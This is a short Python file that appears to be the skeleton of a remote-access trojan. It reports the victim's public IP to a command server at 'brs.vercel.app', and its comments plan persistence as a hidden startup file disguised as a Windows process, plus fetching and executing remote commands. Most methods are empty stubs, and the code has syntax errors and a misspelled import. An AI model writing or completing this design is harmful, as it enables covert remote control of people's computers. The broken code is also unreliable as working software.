import requests, asynico, threading

class Main:

  def __init__(self):
    self.ip = requests.get('https://api.ipify.org?format=json')
    self.centralized_server = 'https://brs.vercel.app'
    self.route = requests.get(f'{self.centralized_server}/{self.ip}')
  def FirstStartup(self):
    try:
      # create a clone of the file with a new name disguised as a windows process, and put into startup as a hidden file.
      pass
    except:
      # uninstall logic - remove from entire computer
      pass
  def Uninstall(self):
    try:
      pass
    except: 
      pass
  def ViewCommand(self);
    try:
      # read commands from self.route and return it
      pass
    except:
      pass
  def PerformCommand(self):
    try:
      # get command from view command and execute it
      pass
    except:
      pass
  def Start(self):
    try:
      pass
    except:
      pass

Main().Start()
